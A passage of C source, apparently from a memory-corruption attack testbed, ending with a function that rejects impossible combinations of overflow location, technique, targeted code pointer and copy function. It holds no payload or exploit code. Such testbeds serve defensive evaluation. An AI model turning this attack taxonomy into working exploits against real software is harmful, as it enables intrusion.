                  (attack.code_ptr == FUNC_PTR_DATA) ||
                  (attack.code_ptr == LONGJMP_BUF_HEAP) ||
                  (attack.code_ptr == LONGJMP_BUF_DATA) ||
                  (attack.code_ptr == LONGJMP_BUF_BSS) ||
                  (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
                  (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
                  (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )
                {
                    fprintf(stderr,
                      "Error: Impossible to perform a direct attack on the stack into another memory segment.\n");
                    return FALSE;
                } else if ((attack.code_ptr == FUNC_PTR_STACK_PARAM) &&
                  ((attack.function == STRCAT) ||
                  (attack.function == SNPRINTF) ||
                  (attack.function == SSCANF) ||
                  (attack.function == HOMEBREW)))
                {
                    fprintf(stderr,
                      "Error: Impossible to attack the stack parameter directly with the following functions: strcat(), snprintf(), sscanf(), homebrew_memcpy()\n");
                    return FALSE;
                }
            }
            break;

        case HEAP:
            if ((attack.technique == DIRECT) &&
              ((attack.code_ptr == RET_ADDR) ||
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (attack.code_ptr == FUNC_PTR_BSS) ||
              (attack.code_ptr == FUNC_PTR_DATA) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (attack.code_ptr == LONGJMP_BUF_BSS) ||
              (attack.code_ptr == LONGJMP_BUF_DATA) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_BSS) ))
            {
                fprintf(stderr,
                  "Error: Impossible to perform a direct attack on the heap into another memory segment.\n");
                return FALSE;
            }
            break;

        case DATA:
            if ((attack.technique == DIRECT) &&
              ((attack.code_ptr == RET_ADDR) ||
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (attack.code_ptr == FUNC_PTR_BSS) ||
              (attack.code_ptr == FUNC_PTR_HEAP) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (attack.code_ptr == LONGJMP_BUF_HEAP) ||
              (attack.code_ptr == LONGJMP_BUF_BSS) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_BSS) ))
            {
                fprintf(stderr,
                  "Error: Impossible to perform a direct attack on the data segment into another memory segment.\n");
                return FALSE;
            }
            break;


        case BSS:
            if ((attack.technique == DIRECT) &&
              ((attack.code_ptr == RET_ADDR) ||
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (attack.code_ptr == FUNC_PTR_DATA) ||
              (attack.code_ptr == FUNC_PTR_HEAP) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (attack.code_ptr == LONGJMP_BUF_HEAP) ||
              (attack.code_ptr == LONGJMP_BUF_DATA) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ))
            {
                fprintf(stderr,
                  "Error: Impossible to perform a direct attack on the bss into another memory segment.\n");
                return FALSE;
            } else if ((attack.technique == INDIRECT) &&
              (attack.code_ptr == LONGJMP_BUF_HEAP) &&
              (!(attack.function == MEMCPY) &&
              !(attack.function == STRNCPY) &&
              !(attack.function == HOMEBREW)))
            {
                fprintf(stderr,
                  "Error: Impossible to perform BSS->Heap Longjmp attacks using string functions.\n");
                return FALSE;
            }
            break;
    }

    return TRUE;
} /* is_attack_possible */
